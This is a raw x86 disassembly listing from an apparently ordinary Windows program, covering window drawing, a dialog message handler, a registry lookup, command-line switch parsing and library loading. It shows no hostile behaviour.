  4026fe:	call   0x4063a0
  402703:	mov    esp,ebp
  402705:	pop    ebp
  402706:	ret    0x4
  402709:	int3   
  40270a:	int3   
  40270b:	int3   
  40270c:	int3   
  40270d:	int3   
  40270e:	mov    edi,edi
  402710:	push   ebp
  402711:	mov    ebp,esp
  402713:	sub    esp,0x1c
  402716:	mov    eax,ds:0x407004
  40271b:	xor    eax,ebp
  40271d:	mov    DWORD PTR [ebp-0x4],eax
  402720:	push   ebx
  402721:	push   edi
  402722:	lea    eax,[ebp-0x14]
  402725:	mov    ebx,edx
  402727:	push   eax
  402728:	push   ecx
  402729:	call   DWORD PTR ds:0x408114
  40272f:	mov    eax,DWORD PTR [ebp-0xc]
  402732:	sub    eax,DWORD PTR [ebp-0x14]
  402735:	mov    DWORD PTR [ebx+0xc],eax
  402738:	mov    eax,DWORD PTR [ebx+0x14]
  40273b:	push   0x0
  40273d:	mov    DWORD PTR [ebp-0x1c],eax
  402740:	call   DWORD PTR ds:0x40810c
  402746:	push   DWORD PTR ds:0x4074dc
  40274c:	mov    edi,eax
  40274e:	push   edi
  40274f:	call   DWORD PTR ds:0x40804c
  402755:	mov    DWORD PTR [ebp-0x18],eax
  402758:	test   eax,eax
  40275a:	je     0x4027a5
  40275c:	mov    edx,DWORD PTR ds:0x4074e8
  402762:	lea    eax,[ebp-0x14]
  402765:	mov    ecx,DWORD PTR [ebx+0xc]
  402768:	and    DWORD PTR [ebp-0x10],0x0
  40276c:	sub    ecx,edx
  40276e:	and    DWORD PTR [ebp-0x8],0x0
  402772:	push   esi
  402773:	lea    esi,[edx+0x6]
  402776:	push   0x410
  40277b:	sub    ecx,esi
  40277d:	mov    DWORD PTR [ebp-0x14],esi
  402780:	mov    esi,DWORD PTR [ebp-0x1c]
  402783:	sub    ecx,0x6
  402786:	push   eax
  402787:	push   esi
  402788:	mov    DWORD PTR [ebp-0xc],ecx
  40278b:	call   DWORD PTR ds:0x408068
  402791:	push   eax
  402792:	push   esi
  402793:	push   edi
  402794:	call   DWORD PTR ds:0x408168
  40279a:	push   DWORD PTR [ebp-0x18]
  40279d:	push   edi
  40279e:	call   DWORD PTR ds:0x40804c
  4027a4:	pop    esi
  4027a5:	push   edi
  4027a6:	push   0x0
  4027a8:	call   DWORD PTR ds:0x408110
  4027ae:	mov    eax,DWORD PTR [ebp-0x8]
  4027b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4027b4:	add    eax,0x6
  4027b7:	mov    DWORD PTR [ebx+0x10],eax
  4027ba:	xor    ecx,ebp
  4027bc:	xor    eax,eax
  4027be:	pop    edi
  4027bf:	inc    eax
  4027c0:	pop    ebx
  4027c1:	call   0x4063a0
  4027c6:	mov    esp,ebp
  4027c8:	pop    ebp
  4027c9:	ret    
  4027ca:	int3   
  4027cb:	int3   
  4027cc:	int3   
  4027cd:	int3   
  4027ce:	int3   
  4027cf:	mov    edi,edi
  4027d1:	push   ebp
  4027d2:	mov    ebp,esp
  4027d4:	sub    esp,0x2c
  4027d7:	mov    eax,ds:0x407004
  4027dc:	xor    eax,ebp
  4027de:	mov    DWORD PTR [ebp-0x4],eax
  4027e1:	push   ebx
  4027e2:	mov    ebx,ecx
  4027e4:	push   edi
  4027e5:	mov    edi,DWORD PTR [ebx+0x2c]
  4027e8:	cmp    edi,0xffffffff
  4027eb:	je     0x402932
  4027f1:	test   edi,edi
  4027f3:	je     0x402932
  4027f9:	test   BYTE PTR [ebx+0xc],0x3
  4027fd:	je     0x40292d
  402803:	test   BYTE PTR [ebx+0x10],0x1
  402807:	mov    eax,ds:0x4074dc
  40280c:	jne    0x402813
  40280e:	mov    eax,ds:0x4074e0
  402813:	push   esi
  402814:	push   eax
  402815:	push   DWORD PTR [ebx+0x18]
  402818:	call   DWORD PTR ds:0x40804c
  40281e:	xor    ecx,ecx
  402820:	mov    esi,eax
  402822:	push   ecx
  402823:	push   ecx
  402824:	push   ecx
  402825:	mov    ecx,DWORD PTR [ebx+0x20]
  402828:	lea    eax,[ebx+0x1c]
  40282b:	push   eax
  40282c:	push   0x2
  40282e:	add    ecx,0x3
  402831:	push   ecx
  402832:	mov    ecx,DWORD PTR [eax]
  402834:	mov    eax,ds:0x4074e8
  402839:	add    eax,0x6
  40283c:	add    eax,ecx
  40283e:	push   eax
  40283f:	push   DWORD PTR [ebx+0x18]
  402842:	call   DWORD PTR ds:0x40803c
  402848:	mov    eax,DWORD PTR [ebx+0x20]
  40284b:	add    eax,0x3
  40284e:	mov    DWORD PTR [ebp-0x10],eax
  402851:	mov    eax,ds:0x4074e8
  402856:	add    eax,0x6
  402859:	add    eax,DWORD PTR [ebx+0x1c]
  40285c:	mov    DWORD PTR [ebp-0x14],eax
  40285f:	mov    eax,DWORD PTR [ebx+0x24]
  402862:	mov    DWORD PTR [ebp-0xc],eax
  402865:	mov    eax,DWORD PTR [ebx+0x28]
  402868:	mov    DWORD PTR [ebp-0x8],eax
  40286b:	lea    eax,[ebp-0x14]
  40286e:	push   0x10
  402870:	push   eax
  402871:	push   edi
  402872:	call   DWORD PTR ds:0x408068
  402878:	push   eax
  402879:	push   edi
  40287a:	push   DWORD PTR [ebx+0x18]
  40287d:	call   DWORD PTR ds:0x408168
  402883:	push   esi
  402884:	push   DWORD PTR [ebx+0x18]
  402887:	call   DWORD PTR ds:0x40804c
  40288d:	test   BYTE PTR [ebx+0x10],0x1
  402891:	je     0x40292c
  402897:	cmp    DWORD PTR ds:0x4074f4,0x0
  40289e:	jne    0x4028b2
  4028a0:	push   DWORD PTR [ebx+0x18]
  4028a3:	call   DWORD PTR ds:0x408058
  4028a9:	mov    ds:0x4074f4,eax
  4028ae:	test   eax,eax
  4028b0:	je     0x40292c
  4028b2:	push   0x7fe3
  4028b7:	push   0x0
  4028b9:	call   DWORD PTR ds:0x408164
  4028bf:	mov    edi,eax
  4028c1:	lea    eax,[ebp-0x2c]
  4028c4:	push   eax
  4028c5:	push   0x18
  4028c7:	push   edi
  4028c8:	call   DWORD PTR ds:0x408044
  4028ce:	push   edi
  4028cf:	push   DWORD PTR ds:0x4074f4
  4028d5:	call   DWORD PTR ds:0x40804c
  4028db:	mov    ecx,DWORD PTR [ebx+0x20]
  4028de:	mov    esi,eax
  4028e0:	mov    eax,ds:0x407594
  4028e5:	add    ecx,0x3
  4028e8:	sub    eax,DWORD PTR [ebp-0x24]
  4028eb:	push   0x8800c6
  4028f0:	push   0x0
  4028f2:	push   0x0
  4028f4:	push   DWORD PTR ds:0x4074f4
  4028fa:	cdq    
  4028fb:	push   DWORD PTR [ebp-0x24]
  4028fe:	sub    eax,edx
  402900:	push   DWORD PTR [ebp-0x28]
  402903:	sar    eax,1
  402905:	add    eax,ecx
  402907:	push   eax
  402908:	mov    eax,DWORD PTR [ebx+0x1c]
  40290b:	add    eax,0x3
  40290e:	push   eax
  40290f:	push   DWORD PTR [ebx+0x18]
  402912:	call   DWORD PTR ds:0x40805c
  402918:	push   esi
  402919:	push   DWORD PTR ds:0x4074f4
  40291f:	call   DWORD PTR ds:0x40804c
  402925:	push   edi
  402926:	call   DWORD PTR ds:0x408054
  40292c:	pop    esi
  40292d:	xor    eax,eax
  40292f:	inc    eax
  402930:	jmp    0x402934
  402932:	xor    eax,eax
  402934:	mov    ecx,DWORD PTR [ebp-0x4]
  402937:	pop    edi
  402938:	xor    ecx,ebp
  40293a:	pop    ebx
  40293b:	call   0x4063a0
  402940:	mov    esp,ebp
  402942:	pop    ebp
  402943:	ret    
  402944:	int3   
  402945:	int3   
  402946:	int3   
  402947:	int3   
  402948:	int3   
  402949:	mov    edi,edi
  40294b:	push   ebp
  40294c:	mov    ebp,esp
  40294e:	sub    esp,0x1c
  402951:	mov    eax,ds:0x407004
  402956:	xor    eax,ebp
  402958:	mov    DWORD PTR [ebp-0x4],eax
  40295b:	push   ebx
  40295c:	push   esi
  40295d:	push   edi
  40295e:	push   0x0
  402960:	push   0x0
  402962:	mov    ebx,edx
  402964:	mov    DWORD PTR [ebp-0x18],ecx
  402967:	push   0x18b
  40296c:	push   ebx
  40296d:	call   DWORD PTR ds:0x408148
  402973:	xor    edi,edi
  402975:	mov    DWORD PTR [ebp-0x1c],eax
  402978:	xor    esi,esi
  40297a:	test   eax,eax
  40297c:	jle    0x402995
  40297e:	push   0x0
  402980:	push   esi
  402981:	push   0x1a1
  402986:	push   ebx
  402987:	call   DWORD PTR ds:0x408148
  40298d:	add    edi,eax
  40298f:	inc    esi
  402990:	cmp    esi,DWORD PTR [ebp-0x1c]
  402993:	jl     0x40297e
  402995:	lea    eax,[ebp-0x14]
  402998:	push   eax
  402999:	push   ebx
  40299a:	call   DWORD PTR ds:0x408114
  4029a0:	mov    eax,DWORD PTR [ebp-0xc]
  4029a3:	sub    eax,DWORD PTR ds:0x4074e8
  4029a9:	sub    eax,DWORD PTR [ebp-0x14]
  4029ac:	push   0x46
  4029ae:	push   edi
  4029af:	sub    eax,0x6
  4029b2:	push   eax
  4029b3:	push   0x0
  4029b5:	push   0x0
  4029b7:	push   DWORD PTR [ebp-0x18]
  4029ba:	push   ebx
  4029bb:	call   DWORD PTR ds:0x408160
  4029c1:	mov    esi,DWORD PTR [ebp-0x10]
  4029c4:	lea    eax,[ebp-0x14]
  4029c7:	sub    esi,DWORD PTR [ebp-0x8]
  4029ca:	mov    ebx,DWORD PTR [ebp-0x18]
  4029cd:	add    esi,edi
  4029cf:	push   eax
  4029d0:	push   ebx
  4029d1:	call   DWORD PTR ds:0x408114
  4029d7:	mov    eax,DWORD PTR [ebp-0x8]
  4029da:	sub    eax,DWORD PTR [ebp-0x10]
  4029dd:	push   0x46
  4029df:	add    eax,esi
  4029e1:	push   eax
  4029e2:	mov    eax,DWORD PTR [ebp-0xc]
  4029e5:	sub    eax,DWORD PTR [ebp-0x14]
  4029e8:	push   eax
  4029e9:	xor    eax,eax
  4029eb:	push   eax
  4029ec:	push   eax
  4029ed:	push   eax
  4029ee:	push   ebx
  4029ef:	call   DWORD PTR ds:0x408160
  4029f5:	mov    ecx,DWORD PTR [ebp-0x4]
  4029f8:	pop    edi
  4029f9:	pop    esi
  4029fa:	xor    ecx,ebp
  4029fc:	pop    ebx
  4029fd:	call   0x4063a0
  402a02:	mov    esp,ebp
  402a04:	pop    ebp
  402a05:	ret    
  402a06:	int3   
  402a07:	int3   
  402a08:	int3   
  402a09:	int3   
  402a0a:	int3   
  402a0b:	int3   
  402a0c:	int3   
  402a0d:	int3   
  402a0e:	int3   
  402a0f:	int3   
  402a10:	mov    edi,edi
  402a12:	push   ebp
  402a13:	mov    ebp,esp
  402a15:	push   ecx
  402a16:	push   ecx
  402a17:	mov    eax,ds:0x407004
  402a1c:	xor    eax,ebp
  402a1e:	mov    DWORD PTR [ebp-0x4],eax
  402a21:	mov    eax,DWORD PTR [ebp+0xc]
  402a24:	mov    ecx,DWORD PTR [ebp+0x14]
  402a27:	push   ebx
  402a28:	push   esi
  402a29:	mov    esi,DWORD PTR [ebp+0x8]
  402a2c:	push   edi
  402a2d:	mov    edi,DWORD PTR [ebp+0x10]
  402a30:	sub    eax,0x2b
  402a33:	je     0x402b96
  402a39:	sub    eax,0x1
  402a3c:	je     0x402b86
  402a42:	sub    eax,0x1
  402a45:	je     0x402b59
  402a4b:	push   0x1
  402a4d:	pop    ebx
  402a4e:	sub    eax,0xe3
  402a53:	je     0x402aab
  402a55:	sub    eax,ebx
  402a57:	je     0x402a90
  402a59:	sub    eax,0x23
  402a5c:	je     0x402a76
  402a5e:	sub    eax,0x3ef
  402a63:	jne    0x402b82
  402a69:	push   eax
  402a6a:	push   esi
  402a6b:	call   DWORD PTR ds:0x408158
  402a71:	jmp    0x402b55
  402a76:	push   0xf
  402a78:	call   DWORD PTR ds:0x40814c
  402a7e:	push   eax
  402a7f:	push   edi
  402a80:	call   DWORD PTR ds:0x408060
  402a86:	mov    eax,ds:0x4074d8
  402a8b:	jmp    0x402b6f
  402a90:	movzx  eax,di
  402a93:	shr    edi,0x10
  402a96:	cmp    di,bx
  402a99:	je     0x402b55
  402a9f:	sub    eax,0x1
  402aa2:	jne    0x402b55
  402aa8:	push   ebx
  402aa9:	jmp    0x402a6a
  402aab:	mov    ecx,esi
  402aad:	call   0x402195
  402ab2:	lea    eax,[ebp-0x8]
  402ab5:	xor    edi,edi
  402ab7:	push   eax
  402ab8:	push   0x2
  402aba:	push   edi
  402abb:	push   0x4070e0
  402ac0:	push   0x80000002
  402ac5:	call   DWORD PTR ds:0x408000
  402acb:	test   eax,eax
  402acd:	jne    0x402ae6
  402acf:	push   0x4013f8
  402ad4:	push   DWORD PTR [ebp-0x8]
  402ad7:	call   DWORD PTR ds:0x408004
  402add:	push   DWORD PTR [ebp-0x8]
  402ae0:	call   DWORD PTR ds:0x408008
  402ae6:	push   0x43
  402ae8:	call   DWORD PTR ds:0x408150
  402aee:	push   esi
  402aef:	mov    ds:0x407588,eax
  402af4:	call   DWORD PTR ds:0x408178
  402afa:	push   0x5
  402afc:	push   edi
  402afd:	push   edi
  402afe:	push   0x20
  402b00:	push   0x20
  402b02:	push   edi
  402b03:	push   esi
  402b04:	call   DWORD PTR ds:0x408160
  402b0a:	mov    edi,0x3ea
  402b0f:	push   edi
  402b10:	push   esi
  402b11:	call   DWORD PTR ds:0x40815c
  402b17:	mov    ecx,eax
  402b19:	call   0x4022ad
  402b1e:	push   edi
  402b1f:	push   esi
  402b20:	call   DWORD PTR ds:0x40815c
  402b26:	mov    edx,eax
  402b28:	mov    ecx,esi
  402b2a:	call   0x402949
  402b2f:	push   0x40758c
  402b34:	push   0x0
  402b36:	push   edi
  402b37:	push   esi
  402b38:	call   DWORD PTR ds:0x40815c
  402b3e:	push   eax
  402b3f:	push   0x402530
  402b44:	push   0x0
  402b46:	push   0x0
  402b48:	call   DWORD PTR ds:0x408084
  402b4e:	push   eax
  402b4f:	call   DWORD PTR ds:0x40807c
  402b55:	mov    eax,ebx
  402b57:	jmp    0x402b6f
  402b59:	test   ecx,ecx
  402b5b:	je     0x402b82
  402b5d:	cmp    DWORD PTR [ecx+0x10],0x0
  402b61:	je     0x402b82
  402b63:	push   DWORD PTR [ecx+0x10]
  402b66:	call   DWORD PTR ds:0x408070
  402b6c:	xor    eax,eax
  402b6e:	inc    eax
  402b6f:	mov    ecx,DWORD PTR [ebp-0x4]
  402b72:	pop    edi
  402b73:	pop    esi
  402b74:	xor    ecx,ebp
  402b76:	pop    ebx
  402b77:	call   0x4063a0
  402b7c:	mov    esp,ebp
  402b7e:	pop    ebp
  402b7f:	ret    0x10
  402b82:	xor    eax,eax
  402b84:	jmp    0x402b6f
  402b86:	cmp    DWORD PTR [ecx],0x2
  402b89:	jne    0x402b6c
  402b8b:	mov    edx,ecx
  402b8d:	mov    ecx,esi
  402b8f:	call   0x40270e
  402b94:	jmp    0x402b6f
  402b96:	cmp    DWORD PTR [ecx],0x2
  402b99:	jne    0x402b6c
  402b9b:	cmp    DWORD PTR [ecx+0x8],0x0
  402b9f:	jl     0x402b6c
  402ba1:	call   0x4027cf
  402ba6:	jmp    0x402b6f
  402ba8:	int3   
  402ba9:	int3   
  402baa:	int3   
  402bab:	int3   
  402bac:	int3   
  402bad:	mov    edx,0x104
  402bb2:	mov    eax,ecx
  402bb4:	push   esi
  402bb5:	mov    esi,edx
  402bb7:	cmp    WORD PTR [eax],0x0
  402bbb:	je     0x402bc5
  402bbd:	add    eax,0x2
  402bc0:	sub    esi,0x1
  402bc3:	jne    0x402bb7
  402bc5:	test   esi,esi
  402bc7:	je     0x402be0
  402bc9:	mov    eax,edx
  402bcb:	push   ecx
  402bcc:	sub    eax,esi
  402bce:	push   0x401390
  402bd3:	push   ecx
  402bd4:	sub    edx,eax
  402bd6:	lea    ecx,[ecx+eax*2]
  402bd9:	call   0x402bee
  402bde:	jmp    0x402be5
  402be0:	mov    eax,0x80070057
  402be5:	pop    esi
  402be6:	ret    0x4
  402be9:	int3   
  402bea:	int3   
  402beb:	int3   
  402bec:	int3   
  402bed:	int3   
  402bee:	mov    edi,edi
  402bf0:	push   ebp
  402bf1:	mov    ebp,esp
  402bf3:	push   edi
  402bf4:	xor    edi,edi
  402bf6:	test   edx,edx
  402bf8:	je     0x402c25
  402bfa:	mov    eax,DWORD PTR [ebp+0xc]
  402bfd:	push   ebx
  402bfe:	push   esi
  402bff:	mov    esi,0x7ffffffe
  402c04:	sub    eax,ecx
  402c06:	test   esi,esi
  402c08:	je     0x402c1f
  402c0a:	movzx  ebx,WORD PTR [eax+ecx*1]
  402c0e:	test   bx,bx
  402c11:	je     0x402c1f
  402c13:	mov    WORD PTR [ecx],bx
  402c16:	add    ecx,0x2
  402c19:	dec    esi
  402c1a:	sub    edx,0x1
  402c1d:	jne    0x402c06
  402c1f:	pop    esi
  402c20:	pop    ebx
  402c21:	test   edx,edx
  402c23:	jne    0x402c2d
  402c25:	sub    ecx,0x2
  402c28:	mov    edi,0x8007007a
  402c2d:	xor    eax,eax
  402c2f:	mov    WORD PTR [ecx],ax
  402c32:	mov    eax,edi
  402c34:	pop    edi
  402c35:	pop    ebp
  402c36:	ret    0xc
  402c39:	int3   
  402c3a:	int3   
  402c3b:	int3   
  402c3c:	int3   
  402c3d:	int3   
  402c3e:	mov    edi,edi
  402c40:	push   ebp
  402c41:	mov    ebp,esp
  402c43:	xor    eax,eax
  402c45:	test   edx,edx
  402c47:	je     0x402c51
  402c49:	cmp    edx,0x7fffffff
  402c4f:	jbe    0x402c56
  402c51:	mov    eax,0x80070057
  402c56:	test   eax,eax
  402c58:	js     0x402c66
  402c5a:	push   ecx
  402c5b:	push   DWORD PTR [ebp+0x8]
  402c5e:	push   ecx
  402c5f:	call   0x402bee
  402c64:	jmp    0x402c6f
  402c66:	test   edx,edx
  402c68:	je     0x402c6f
  402c6a:	xor    edx,edx
  402c6c:	mov    WORD PTR [ecx],dx
  402c6f:	pop    ebp
  402c70:	ret    0x4
  402c73:	int3   
  402c74:	int3   
  402c75:	int3   
  402c76:	int3   
  402c77:	int3   
  402c78:	mov    edi,edi
  402c7a:	push   ebp
  402c7b:	mov    ebp,esp
  402c7d:	push   ecx
  402c7e:	mov    eax,ds:0x407004
  402c83:	xor    eax,ebp
  402c85:	mov    DWORD PTR [ebp-0x4],eax
  402c88:	push   esi
  402c89:	push   0x401418
  402c8e:	xor    esi,esi
  402c90:	call   DWORD PTR ds:0x408088
  402c96:	test   eax,eax
  402c98:	je     0x402cbd
  402c9a:	push   edi
  402c9b:	push   0x401434
  402ca0:	push   eax
  402ca1:	call   DWORD PTR ds:0x40808c
  402ca7:	mov    edi,eax
  402ca9:	test   edi,edi
  402cab:	je     0x402cbc
  402cad:	push   esi
  402cae:	push   esi
  402caf:	push   esi
  402cb0:	push   esi
  402cb1:	mov    ecx,edi
  402cb3:	call   DWORD PTR ds:0x4082f0
  402cb9:	call   edi
  402cbb:	inc    esi
  402cbc:	pop    edi
  402cbd:	mov    ecx,DWORD PTR [ebp-0x4]
  402cc0:	mov    eax,esi
  402cc2:	xor    ecx,ebp
  402cc4:	pop    esi
  402cc5:	call   0x4063a0
  402cca:	mov    esp,ebp
  402ccc:	pop    ebp
  402ccd:	ret    
  402cce:	int3   
  402ccf:	int3   
  402cd0:	int3   
  402cd1:	int3   
  402cd2:	int3   
  402cd3:	mov    edi,edi
  402cd5:	push   ebx
  402cd6:	push   esi
  402cd7:	xor    ebx,ebx
  402cd9:	mov    esi,ecx
  402cdb:	push   edi
  402cdc:	mov    edi,ebx
  402cde:	jmp    0x402d88
  402ce3:	cmp    ax,0x2d
  402ce7:	je     0x402cfa
  402ce9:	cmp    ax,0x2f
  402ced:	je     0x402cfa
  402cef:	add    esi,0x2
  402cf2:	movzx  eax,WORD PTR [esi]
  402cf5:	test   ax,ax
  402cf8:	jne    0x402ce3
  402cfa:	cmp    WORD PTR [esi],bx
  402cfd:	je     0x402d94
  402d03:	push   0x401448
  402d08:	add    esi,0x2
  402d0b:	push   esi
  402d0c:	call   DWORD PTR ds:0x408100
  402d12:	test   eax,eax
  402d14:	je     0x402e59
  402d1a:	push   0x4014c4
  402d1f:	push   esi
  402d20:	call   DWORD PTR ds:0x408100
  402d26:	test   eax,eax
  402d28:	je     0x402e43
  402d2e:	push   0x4014e0
  402d33:	push   esi
  402d34:	call   DWORD PTR ds:0x408100
  402d3a:	test   eax,eax
  402d3c:	je     0x402e30
  402d42:	push   0x4014f0
  402d47:	push   esi
  402d48:	call   DWORD PTR ds:0x408100
  402d4e:	test   eax,eax
  402d50:	je     0x402dd8
  402d56:	push   0x40151c
  402d5b:	push   esi
  402d5c:	call   DWORD PTR ds:0x408100
  402d62:	test   eax,eax
  402d64:	je     0x402d9a
  402d66:	movzx  eax,WORD PTR [esi]
  402d69:	sub    eax,0x62
  402d6c:	je     0x402d82
  402d6e:	sub    eax,0x10
  402d71:	je     0x402d7d
  402d73:	sub    eax,0x1
  402d76:	jne    0x402d85
  402d78:	or     edi,0x4
  402d7b:	jmp    0x402d85
  402d7d:	or     edi,0x1
  402d80:	jmp    0x402d85
  402d82:	or     edi,0x2
  402d85:	add    esi,0x2
  402d88:	movzx  eax,WORD PTR [esi]
  402d8b:	test   ax,ax
  402d8e:	jne    0x402ce3
  402d94:	mov    eax,edi
  402d96:	pop    edi
  402d97:	pop    esi
  402d98:	pop    ebx
  402d99:	ret    
  402d9a:	mov    esi,0x4000
  402d9f:	test   DWORD PTR ds:0x407500,esi
  402da5:	je     0x402db3
  402da7:	push   ecx
  402da8:	push   ecx
  402da9:	mov    ecx,0x401168
  402dae:	call   0x403129
  402db3:	call   0x4043ce
  402db8:	call   0x4044e2
  402dbd:	test   DWORD PTR ds:0x407500,esi
  402dc3:	je     0x402dd1
  402dc5:	push   ecx
  402dc6:	push   ecx
  402dc7:	mov    ecx,0x4010f8
  402dcc:	call   0x403129
  402dd1:	push   ebx
  402dd2:	call   DWORD PTR ds:0x408090
  402dd8:	call   0x404bab
  402ddd:	test   eax,eax
  402ddf:	jne    0x402deb
  402de1:	call   0x4043ce
  402de6:	call   0x4044e2
  402deb:	push   0x43
  402ded:	call   DWORD PTR ds:0x408150
  402df3:	test   eax,eax
  402df5:	jne    0x402e0a
  402df7:	push   0x43
  402df9:	call   DWORD PTR ds:0x408150
  402dff:	test   eax,eax
  402e01:	jne    0x402e0a
  402e03:	push   ebx
  402e04:	call   DWORD PTR ds:0x4080b0
  402e0a:	call   0x404bab
  402e0f:	test   eax,eax
  402e11:	jne    0x402e29
  402e13:	push   0x43
  402e15:	call   DWORD PTR ds:0x408150
  402e1b:	test   eax,eax
  402e1d:	jne    0x402e29
  402e1f:	call   0x4046da
  402e24:	call   0x404b3d
  402e29:	call   0x404b55
  402e2e:	jmp    0x402dd1
  402e30:	push   0x1e
  402e32:	call   DWORD PTR ds:0x4080fc
  402e38:	test   eax,eax
  402e3a:	je     0x402dd1
  402e3c:	call   0x404aa0
  402e41:	jmp    0x402dd1
  402e43:	push   0x1e
  402e45:	call   DWORD PTR ds:0x4080fc
  402e4b:	test   eax,eax
  402e4d:	je     0x402dd1
  402e4f:	call   0x402c78
  402e54:	jmp    0x402dd1
  402e59:	push   0x1e
  402e5b:	call   DWORD PTR ds:0x4080fc
  402e61:	test   eax,eax
  402e63:	je     0x402dd1
  402e69:	push   ebx
  402e6a:	push   0x4037c0
  402e6f:	push   ebx
  402e70:	push   0x3
  402e72:	mov    edx,0x401460
  402e77:	mov    ecx,0x80000002
  402e7c:	call   0x403148
  402e81:	jmp    0x402dd1
  402e86:	int3   
  402e87:	int3   
  402e88:	int3   
  402e89:	int3   
  402e8a:	int3   
  402e8b:	mov    edi,edi
  402e8d:	push   ebp
  402e8e:	mov    ebp,esp
  402e90:	and    esp,0xfffffff8
  402e93:	sub    esp,0x494
  402e99:	mov    eax,ds:0x407004
  402e9e:	xor    eax,esp
  402ea0:	mov    DWORD PTR [esp+0x490],eax
  402ea7:	push   ebx
  402ea8:	mov    ebx,DWORD PTR [ebp+0x10]
  402eab:	xor    eax,eax
  402ead:	push   esi
  402eae:	mov    esi,DWORD PTR [ebp+0x8]
  402eb1:	push   edi
  402eb2:	push   eax
  402eb3:	push   eax
  402eb4:	push   0x1
  402eb6:	push   eax
  402eb7:	mov    edi,eax
  402eb9:	call   DWORD PTR ds:0x408094
  402ebf:	push   ecx
  402ec0:	push   ecx
  402ec1:	call   0x4030f6
  402ec6:	movzx  eax,WORD PTR ds:0x401568
  402ecd:	push   eax
  402ece:	push   0x401568
  402ed3:	push   0x2
  402ed5:	push   DWORD PTR ds:0x4074d4
  402edb:	push   DWORD PTR ds:0x4074d0
  402ee1:	call   DWORD PTR ds:0x408020
  402ee7:	call   0x404c90
  402eec:	push   edi
  402eed:	call   DWORD PTR ds:0x4082e8
  402ef3:	test   eax,eax
  402ef5:	js     0x402f3e
  402ef7:	mov    ecx,ebx
  402ef9:	call   0x402cd3
  402efe:	mov    ds:0x4074f8,eax
  402f03:	mov    DWORD PTR ds:0x407584,esi
  402f09:	push   edi
  402f0a:	test   al,0x1
  402f0c:	je     0x402f28
  402f0e:	push   0x4037c0
  402f13:	push   edi
  402f14:	push   0x3
  402f16:	mov    edx,0x401460
  402f1b:	mov    ecx,0x80000002
  402f20:	call   0x403148
  402f25:	inc    edi
  402f26:	jmp    0x402f38
  402f28:	push   0x402a10
  402f2d:	push   0x0
  402f2f:	push   0x65
  402f31:	push   esi
  402f32:	call   DWORD PTR ds:0x408154
  402f38:	call   DWORD PTR ds:0x408188
  402f3e:	mov    esi,0x488
  402f43:	lea    eax,[esp+0x10]
  402f47:	push   esi
  402f48:	xor    ebx,ebx
  402f4a:	push   ebx
  402f4b:	push   eax
  402f4c:	call   0x406aee
  402f51:	add    esp,0xc
  402f54:	mov    DWORD PTR [esp+0x10],esi
  402f58:	lea    eax,[esp+0x10]
  402f5c:	mov    DWORD PTR [esp+0x3c],0x20000
  402f64:	mov    DWORD PTR [esp+0x50],0x20801
  402f6c:	mov    DWORD PTR [esp+0x7c],0x78
  402f74:	push   eax
  402f75:	push   0x401530
  402f7a:	push   ebx
  402f7b:	push   ebx
  402f7c:	mov    DWORD PTR [esp+0x90],0x280
  402f87:	call   DWORD PTR ds:0x408264
  402f8d:	call   0x402fb0
  402f92:	mov    ecx,DWORD PTR [esp+0x49c]
  402f99:	mov    eax,edi
  402f9b:	pop    edi
  402f9c:	pop    esi
  402f9d:	pop    ebx
  402f9e:	xor    ecx,esp
  402fa0:	call   0x4063a0
  402fa5:	mov    esp,ebp
  402fa7:	pop    ebp
  402fa8:	ret    0x10
  402fab:	int3   
  402fac:	int3   
  402fad:	int3   
  402fae:	int3   
  402faf:	int3   
  402fb0:	mov    ecx,DWORD PTR ds:0x4074d0
  402fb6:	mov    eax,ecx
  402fb8:	mov    edx,DWORD PTR ds:0x4074d4
  402fbe:	or     eax,edx
  402fc0:	jne    0x402fc3
  402fc2:	ret    
  402fc3:	push   edx
  402fc4:	push   ecx
  402fc5:	call   DWORD PTR ds:0x408024
  402fcb:	and    DWORD PTR ds:0x4074d0,0x0
  402fd2:	and    DWORD PTR ds:0x4074d4,0x0
  402fd9:	ret    
  402fda:	int3   
  402fdb:	int3   
  402fdc:	int3   
  402fdd:	int3   
  402fde:	int3   
  402fdf:	int3   
  402fe0:	mov    edi,edi
  402fe2:	push   ebp
  402fe3:	mov    ebp,esp
  402fe5:	push   ebx
  402fe6:	push   esi
  402fe7:	push   edi
  402fe8:	mov    edi,DWORD PTR [ebp+0x28]
  402feb:	test   edi,edi
  402fed:	je     0x4030ea
  402ff3:	mov    eax,DWORD PTR [ebp+0xc]
  402ff6:	xor    ebx,ebx
  402ff8:	sub    eax,ebx
  402ffa:	je     0x4030b1
  403000:	sub    eax,0x1
  403003:	jne    0x4030ea
  403009:	mov    al,BYTE PTR [ebp+0x10]
  40300c:	mov    BYTE PTR [edi+0x28],al
  40300f:	mov    eax,DWORD PTR [ebp+0x14]
  403012:	mov    DWORD PTR [edi+0x10],eax
  403015:	mov    eax,DWORD PTR [ebp+0x18]
  403018:	mov    DWORD PTR [edi+0x14],eax
  40301b:	mov    eax,DWORD PTR [ebp+0x1c]
  40301e:	mov    DWORD PTR [edi+0x18],eax
  403021:	mov    eax,DWORD PTR [ebp+0x20]
  403024:	mov    DWORD PTR [edi+0x1c],eax
  403027:	xor    eax,eax
  403029:	mov    DWORD PTR [edi+0x24],0x1
  403030:	cmp    ax,WORD PTR [edi+0x2a]
  403034:	jae    0x4030ea
  40303a:	mov    eax,DWORD PTR [edi+0x30]
  40303d:	mov    cl,BYTE PTR [edi+0x28]
  403040:	mov    edx,DWORD PTR [eax+ebx*8]
  403043:	mov    esi,DWORD PTR [eax+ebx*8+0x4]
  403047:	mov    eax,DWORD PTR [edi+0x34]
  40304a:	cmp    BYTE PTR [ebx+eax*1],cl
  40304d:	jbe    0x403053
  40304f:	test   cl,cl
  403051:	jne    0x40307b
  403053:	mov    eax,edx
  403055:	or     eax,esi
  403057:	je     0x403090
  403059:	mov    ecx,DWORD PTR [edi+0x10]
  40305c:	mov    eax,DWORD PTR [edi+0x14]
  40305f:	and    ecx,edx
  403061:	and    eax,esi
  403063:	or     ecx,eax
  403065:	je     0x40307b
  403067:	mov    eax,DWORD PTR [edi+0x18]
  40306a:	mov    ecx,DWORD PTR [edi+0x1c]
  40306d:	and    eax,edx
  40306f:	and    ecx,esi
  403071:	cmp    eax,DWORD PTR [edi+0x18]
  403074:	jne    0x40307b
  403076:	cmp    ecx,DWORD PTR [edi+0x1c]
  403079:	je     0x403090
  40307b:	mov    edx,DWORD PTR [edi+0x2c]
  40307e:	mov    esi,ebx
  403080:	shr    esi,0x5
  403083:	mov    ecx,ebx
  403085:	and    ecx,0x1f
  403088:	mov    eax,DWORD PTR [edx+esi*4]
